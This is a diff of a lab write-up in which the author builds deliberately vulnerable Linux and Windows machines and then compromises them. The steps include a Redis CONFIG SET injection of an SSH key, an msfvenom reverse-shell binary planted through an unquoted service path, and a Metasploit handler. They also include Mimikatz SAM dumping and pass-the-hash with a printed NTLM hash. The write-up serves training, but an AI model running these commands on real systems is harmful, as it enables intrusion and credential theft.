@@ -21,7 +21,9 @@ Quick version of the full attack path:
 
 - Foothold on **WEB01** via a React Server Components deserialization bug (CVE-2025-55182), then root via a kernel LPE, CopyFail, before pivoting into the internal network with Ligolo-ng, exposing four more machines. From there.
 
-- **Box 2** falls to Drupalgeddon2 (CVE-2018-7600) for a www-data shell, escalated to root via another kernel LPE, DirtyFrag. **Box 3** goes down next through a WordPress plugin LFI-to-RCE chain (CVE-2023-6553, PHP filter chains) for www-data, followed by a misconfigured SUID find binary for root.
+- **Box 2** falls to Drupalgeddon2 (CVE-2018-7600) for a www-data shell, escalated to root via another kernel LPE, DirtyFrag.
+
+- **Box 3** goes down next through a WordPress plugin LFI-to-RCE chain (CVE-2023-6553, PHP filter chains) for www-data, followed by a misconfigured SUID find binary for root.
 
 - **Box 4** is a pure misconfig box, where a no_root_squash NFS share leaks Windows credentials outright, while Samba's usermap script (CVE-2007-2447), an unauthenticated Redis instance, and a passwordless sudo rule allowing the leaked user to run nano as root (GTFOBins) all offer independent routes straight to root anyway.
 
@@ -1900,51 +1902,64 @@ sudo make install
 
 This builds Redis 3.2.13 from source, which is vulnerable to arbitrary file write via CONFIG SET without the modern restrictions.
 
-Create the directories Redis needs :
+Now we first make a directory for the config and one for where the DB will actually live :
 
 ```bash
 sudo mkdir -p /usr/local/redis/etc
-sudo mkdir -p /home/azerty/.ssh
+sudo mkdir -p /var/lib/redis
 ```
 
-Create the config file to expose Redis and point to the SSH directory :
+Now create the config file at `/usr/local/redis/etc/redis.conf`. Keep the server dumb and normal  we just expose it, nothing more :
 
 ```bash
-sudo nano /usr/local/redis/etc/redis.conf
-```
+nano /usr/local/redis/etc/redis.conf
 
-Inside of it we add these lines :
+# Inside the file :
 
-```bash
 bind 0.0.0.0
 protected-mode no
 port 6379
-dir /home/azerty/.ssh
-dbfilename authorized_keys
+dir /var/lib/redis
+dbfilename dump.rdb
 ```
 
-- bind 0.0.0.0 exposes Redis on all interfaces.
-- protected-mode no disables the safety guard.
-- dir and dbfilename pre-configure where the database will be saved.
+- `bind 0.0.0.0` exposes Redis on all interfaces.
+- `protected-mode no` disables the safety guard preventing unauthorized connections.
+- `dir` and `dbfilename` point at a normal, valid location — `/var/lib/redis/dump.rdb`.
 
-Kill any old Redis processes and start the new vulnerable version :
+Kill any old instance and start the vulnerable server. Run it in the **foreground** first (no `&`) so you can watch it boot cleanly instead of dying silently :
 
 ```bash
 sudo pkill -f redis-server
+sudo /usr/local/bin/redis-server /usr/local/redis/etc/redis.conf
+```
+
+<img width="1460" height="785" alt="image" src="https://github.com/user-attachments/assets/94e9e22e-438e-4307-9644-443b241b04f4" />
+
+Once you see it come up healthy, `Ctrl+C` and relaunch it in the background :
+
+```bash
 sudo /usr/local/bin/redis-server /usr/local/redis/etc/redis.conf &
 ```
 
-Then finally verify it's listenning :
+Verify it's actually listening :
 
 ```bash
-redis-cli ping
+redis-cli ping        # -> PONG
 ```
 
-It should respond with a PONG . 
+Last thing on the server side we create the `.ssh` folder for the `azerty` user with correct ownership and permissions, so that when the key gets injected later, SSH's `StrictModes` actually accepts it (an existing `.ssh` that's `700` and user owned is a normal, healthy SSH setup — we're not putting any key here yet) :
 
-<img width="1478" height="627" alt="image" src="https://github.com/user-attachments/assets/c0c84487-12e2-4331-a852-bf2d4e85aef1" />
+```bash
+sudo mkdir -p /home/azerty/.ssh
+sudo chown -R azerty:azerty /home/azerty/.ssh
+sudo chmod 700 /home/azerty/.ssh
+```
 
-Redis is now Set up . 
+<img width="1382" height="740" alt="image" src="https://github.com/user-attachments/assets/303d6673-f50d-429e-b5cc-b47281cea74b" />
+
+Now Redis is setup . 
+
 
 ##### PrivEsc : 
 
@@ -2236,7 +2251,7 @@ int main()
 We then compile it into a Windows executable:
 
 ```bash
-x86_64-w64-mingw32-gcc backup.c -o backup.exe
+x86_64-w64-mingw32-gcc backup.c -o backup.exe -ladvapi32
 ```
 
 Verify that the output is a Windows executable:
@@ -2297,7 +2312,7 @@ This gives the service the highest privileges on the local machine.
 
 We create the service using `sc.exe`:
 
-```cmd
+```bash
 sc.exe create BackupService binPath= "C:\Program Files\Backup Service\backup.exe" start= auto
 ```
 
@@ -2319,7 +2334,7 @@ However, we intentionally leave the path unquoted to reproduce the vulnerability
 
 Now we verify the service configuration:
 
-```cmd
+```text
 sc.exe qc BackupService
 ```
 
@@ -2378,6 +2393,19 @@ The output should now contain:
 ```text
 (A;;RPWP;;;WD)
 ```
+
+**Grant Svc_backup Write Acess:**
+
+Our user should have write access on the Program Files folder so that we can add our malicious Backup.exe there . 
+
+```powershell
+takeown /F "C:\Program Files"
+icacls "C:\Program Files" /grant "svc_backup:(M)"
+```
+
+<img width="970" height="501" alt="image" src="https://github.com/user-attachments/assets/9f74a712-e1ce-4aad-a0c5-f0aa26200799" />
+
+We see that we now have (M) which is Modify permissions .
 
 At this point, the service is fully prepared for exploitation.
 
@@ -4311,7 +4339,8 @@ Looking at the version , we find SAMBA 3.0 , and from the nmap script , we find 
 
 Now let's deeply enumerate each port :
 
-**NFS**
+
+##### NFS : 
 
 First let's see if we can mount the NFS server on our kali machine without authentication .
 
@@ -4402,7 +4431,7 @@ We see that we got our Root Access by abusing the nano binary .
 Now let's check the other ways we can get Root on this box : 
 
 
-**Samba :**
+##### Samba : 
 
 Looking at the scan result , we see that the host is running SAMBA 3.0 , if we check searchsploit for known Vulnerabilities : 
 
@@ -4447,7 +4476,9 @@ The exploit will grant us immediate Root access .
 
 Now moving on to the Redis server : 
 
-**Redis :**
+
+
+##### Redis : 
 
 First let's try if we can access the Redis server : 
 
@@ -4455,10 +4486,301 @@ First let's try if we can access the Redis server :
 
 If we get PONG this means Redis server is reachable . 
 
-<img width="1093" height="799" alt="image" src="https://github.com/user-attachments/assets/17b5f8b9-cf1e-421e-ada7-e4787ca85843" />
+<img width="1099" height="888" alt="image" src="https://github.com/user-attachments/assets/95394d2a-c2e9-43e5-95d0-6c5db55ce79b" />
 
-We are also able to gather more information about the Redis server , like the versions , directories,etc .
+We can also pull more info about the server with redis-cli , this leaks the Redis version, OS, and process info, and config get dir shows us the directory Redis is writing to.
 
-Now let's try to generate our ssh keys , then put them inside the Redis DB , and login using them :
+```bash
+redis-cli -h 10.10.10.40 info server
+redis-cli -h 10.10.10.40 config get dir
+```
+
+Since we know the directories Redis is writing to , and since Redis is reachable , and doesn't require auth by default , we can write into the same directory Redis is writing to , let's write our SSH key into that machine , and login via SSH . 
+
+First, we generate the keys , the public key will be the one we put inside the Target and the private one is the one we use to login . 
+
+```bash
+ssh-keygen -t rsa -b 4096 -f redis_key -N ""
+```
+
+<img width="1121" height="783" alt="image" src="https://github.com/user-attachments/assets/5e535c8d-c0c5-4fe4-900b-e6ffcb549b05" />
+
+This gives us redis_key (private) and redis_key.pub (public) , the pub key is the one we're going to smuggle into the target .
+
+now the trick with old Redis and CONFIG SET is that we can point dir and dbfilename anywhere we want , then SAVE writes whatever's in the DB straight to that file as raw text . if we control the value we write to a key , and the value looks enough like a valid authorized_keys line , the dump ends up being a working file .
+
+first we set the path :
+
+```bash
+redis-cli -h 10.10.10.40 config set dir /home/azerty/.ssh/
+redis-cli -h 10.10.10.40 config get dir
+```
+
+<img width="972" height="484" alt="image" src="https://github.com/user-attachments/assets/ec4bcc05-56b3-4005-8cef-5df297ab87e4" />
+
+This should return /home/azerty/.ssh/ , confirming Redis is happy to write there , this only worked because we already created that folder with the right ownership and 700 perms earlier , otherwise Redis running as its own low priv user wouldn't be able to write into it .
+
+Then we set the filename :
+
+```bash
+redis-cli -h 10.10.10.40 config set dbfilename "authorized_keys"
+```
+
+Now we need to actually get our key into the DB , we pad it with newlines so it lands cleanly on its own line inside the dump , then set it as a value :
+
+```bash
+(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") | redis-cli -h 10.10.10.40 -x set sshkey
+```
+
+Then we just force a save :
+
+```bash
+redis-cli -h 10.10.10.40 save
+```
+
+<img width="1442" height="710" alt="image" src="https://github.com/user-attachments/assets/b6829650-2912-496a-80a9-659ce62a3949" />
+
+if that comes back OK , Redis just wrote our pubkey out to /home/azerty/.ssh/authorized_keys .
+
+last step , we ssh in with the matching private key :
+
+```bash
+ssh -i redis_key azerty@10.10.10.40
+```
+
+<img width="1252" height="689" alt="image" src="https://github.com/user-attachments/assets/7362cb0c-6483-4fe2-bb57-b883e6a70fbf" />
+
+We are able to login via SSH, as the azerty user , since it was the user we setup the entire scenario with he already had NOPASS ALL which means he can run any binary as the Root user without needing a password .
+
+In this case we chose to run the su binary to get Root : 
+
+```bash
+sudo su
+```
+
+<img width="1226" height="610" alt="image" src="https://github.com/user-attachments/assets/e17aa8ff-5901-44b4-9512-bf8c3356a883" />
+
+We manage to get Root with 3 different Paths for this machine . 
+
+Now let's move the Rogue machine . 
+
+
+#### Rogue : 
+
+
+Now back to our nmap scan we found 2 Windows Boxes , 1 was the DC and the second one was a Windows Workstation . 
+
+<img width="899" height="378" alt="image" src="https://github.com/user-attachments/assets/c30305b3-3c6d-4c4c-9334-f04b18303b04" />
+
+Scanning all ports , we find 3 : Winrm , RDP , and panda-pub .
+
+<img width="1216" height="783" alt="image" src="https://github.com/user-attachments/assets/04809f9b-137e-463d-b942-e820554da972" />
+
+Version scanning and default scripts didn't return anything useful . 
+
+We already have these creds from the NFS server : 
+
+```bash
+svc_backup : Backup@123
+```
+
+Let's test them to see if we can login via Winrm , or RDP . 
+
+```bash
+nxc rdp 10.10.10.50 -u svc_backup -p 'Backup@123' --local-auth
+nxc winrm 10.10.10.50 -u svc_backup -p 'Backup@123' --local-auth
+```
+
+<img width="1436" height="452" alt="image" src="https://github.com/user-attachments/assets/b187b90c-8f13-426b-bf92-dddd505c5732" />
+
+Our user can login via Winrm but can't RDP to the machine , let's connect via Winrm :
+
+```bash
+evil-winrm -i 10.10.10.50 -u svc_backup -p "Backup@123"
+```
+
+<img width="1472" height="580" alt="image" src="https://github.com/user-attachments/assets/cb5e4e6b-0f6f-430a-b268-9d150cf39ca1" />
+
+Now that we got access , let's import some tools to help us find the privesc vector , before importing Winpeas , we can do a quick check using PowerUp.ps1 . 
+
+```bash
+https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+```
+
+Importing Tools is pretty simple using Evil-winrm , we just use the upload function : 
+
+<img width="1627" height="819" alt="image" src="https://github.com/user-attachments/assets/bbfff7f4-9db5-4a86-853f-e1a3e654cc7b" />
+
+Just make sure you specify the correct path . 
+
+<img width="1660" height="831" alt="image" src="https://github.com/user-attachments/assets/713a2c52-3601-4234-aab2-d546583b55dc" />
+
+If the size doesn't match you can zip it , transfer it to the Pivot Box then from there import it to the Windows box . 
+
+Now that we uploaded PowerUP , we can first bypass the execution policy otherwise we will get an error since we can't run Scripts : 
+
+<img width="1687" height="565" alt="image" src="https://github.com/user-attachments/assets/90acfeb1-cd56-4f8c-a7f8-80391538c64c" />
+
+```bash
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+. .\PowerUp.ps1   # Import the module 
+Invoke-Allchecks  # Run the checks 
+```
+
+<img width="1128" height="782" alt="image" src="https://github.com/user-attachments/assets/0d253df4-283f-4aaf-a29a-8c2328caa81c" />
+
+I tried both Winpeas and PowerUp but they didn't find the Unquoted Service Path , so we will do it manually , first let's list all Services and check for interesting ones : 
+
+```powershell
+Get-Service
+```
+
+<img width="924" height="620" alt="image" src="https://github.com/user-attachments/assets/3bef86ef-96ad-4b63-918c-ca5fc24c874f" />
+
+We find an unusual one , BackupService , let's enumerate it further using sc : 
+
+```powershell
+sc.exe query BackupService
+sc.exe qc BackupService
+```
+
+<img width="1174" height="655" alt="image" src="https://github.com/user-attachments/assets/b367e9fa-93ff-42d4-8092-a04bd90bdc73" />
+
+Found it , Unquoted service path , and it is running as System . 
+
+As long as we have write access to C:\Program Files\, we can drop a malicious Backup.exe there directly. Because Windows checks each space-delimited segment of the unquoted path in order, it finds and executes our C:\Program Files\Backup.exe before ever reaching the intended C:\Program Files\Backup Service\backup.exe. Since the service runs as SYSTEM, our binary which will be a reverse shell will be executed with SYSTEM privileges.
+
+First let's check if we have access to write into this folder : 
+
+```powershell
+icacls "C:\Program Files"
+```
+
+<img width="1263" height="585" alt="image" src="https://github.com/user-attachments/assets/256f579f-18f3-4e6d-80bb-5908d8a424ec" />
+
+Perfect , we have Modify (M) writes over the entire Directory . 
+
+Now on our Kali machine let's generate our Reverse shell , then setup a listener . 
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=7777 -f exe -o Backup.exe
+```
+
+For the LHOST , we're using the Pivot Box to catch the session , but different port this time , we will open it via Ligolo later . 
+
+Once generated , we transfer it to the target machine using our Winrm session : 
+
+<img width="1920" height="693" alt="image" src="https://github.com/user-attachments/assets/ec6cae13-8dd1-4c82-b74b-6e04b7af2194" />
+
+Then we set up our Listener , we will use multi handler for this one .
+
+For the LHOST we will open a new Listener , on port 7777 using Ligolo .
+
+```bash
+ listener_add --addr 0.0.0.0:7777 --to 127.0.0.1:7777 --tcp
+```
+
+<img width="1473" height="425" alt="image" src="https://github.com/user-attachments/assets/3c64230b-ee96-4bb0-acc5-7e4877ac2edd" />
+
+Now we just set up the multi handler , for the LHOST we will use the Pivor box IP like we did before and the payload as windows/x64/shell_reverse_tcp just like we specified when creating the reverse shell . 
+
+```bash
+msf > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set LHOST 10.10.10.10
+LHOST => 10.10.10.10
+msf exploit(multi/handler) > set LPORT 7777
+LPORT => 7777
+msf exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+payload => windows/x64/shell_reverse_tcp
+msf exploit(multi/handler) > run
+```
+
+Now we just move the new Backup.exe to the Program Files directory , from there we restart the service and it should execute the reverse shell . 
+
+<img width="1890" height="860" alt="image" src="https://github.com/user-attachments/assets/680b0f0f-d36d-4f27-8e89-72d63e6cfa3a" />
+
+We see that we are now System . 
+
+**Other Path :**
+
+Now there is another way to get System , we need to RDP to the box to be able to run the Rogue Planet exploit which will give us SYSTEM as well . 
+
+First let's import Mimikatz , dump hashes , get the admin hash and login via RDP . 
+
+To make life easier when it comes to importing our tools we will upgrade our shell to a mterpreter shell , we can use this module : 
+
+```bash
+use multi/manage/shell_to_meterpreter
+```
+
+First we run CTRL Z to background our shell , use this post exploitation module , it takes as a parameter the Session we have earlier , then we run it : 
+
+<img width="1290" height="673" alt="image" src="https://github.com/user-attachments/assets/6f23e20e-0c60-49e0-bdef-d087c0b245dc" />
+
+It should fail at first , since we're using a Ligolo proxy there are few things we need to change . 
+
+First we need to created a new listener , we will use 4443 since this is what the module uses by default : 
+
+```bash
+listener_add --addr 0.0.0.0:4433 --to 127.0.0.1:4433 --tcp
+```
+
+<img width="1433" height="502" alt="image" src="https://github.com/user-attachments/assets/686ed447-055e-42c0-bf51-c5281d20c957" />
+
+Then for the LHOST we should specify the one of our Pivot Host : 
+
+```bash
+set SESSION 1
+set LHOST 10.10.10.10
+run
+```
+
+<img width="1470" height="813" alt="image" src="https://github.com/user-attachments/assets/19765792-c9bf-4281-9ebe-e29b57740eb9" />
+
+
+Perfect we got our Meterpreter session , to interact with it , we just type : 
+
+
+```bash
+sessions -i 2
+```
+
+<img width="1437" height="553" alt="image" src="https://github.com/user-attachments/assets/77853941-bb48-4ad2-b240-9717c1416a68" />
+
+We just navigate to the directory where we're hosting our tools : 
+
+<img width="1426" height="351" alt="image" src="https://github.com/user-attachments/assets/d8e3c602-1ca0-4e0b-9916-d472a58c7353" />
+
+We just import it now using our meterpreter session 
+
+- If you don't want to use Meterpreter , you can manually import them to the Pivor box then from there we transfer it to the windows box .
+- Or just create a reverse shell with a Meterpreter shell from the beguinning , but in this case i just wanted to test if it will work so i didn't want to risk using a meterpreter one . 
+
+<img width="1357" height="548" alt="image" src="https://github.com/user-attachments/assets/c4faa5bd-f521-4f5c-bff4-cdee1225de5d" />
+
+Once inside Mimikatz : 
+
+```bash
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+```
+
+<img width="1202" height="638" alt="image" src="https://github.com/user-attachments/assets/ae321004-41a4-4c6b-8916-20c06f67dcf2" />
+
+We got the NTLM hash of the elmehdi user that we will use to RDP to the machine , let's verify if this user can RDP : 
+
+```bash
+nxc rdp 10.10.10.50 -u elmehdi -H c22b315c040ae6e0efee3518d830362b
+```
+
+<img width="1490" height="374" alt="image" src="https://github.com/user-attachments/assets/bd6c4126-d148-4b63-9f84-07651bce4c90" />
+
+We see the pwn3d! which means this user can login via RDP .
+
+So now all we need to do is RDP to the machine , import our exploit , run it and it should give us System . 
+
+
 
 
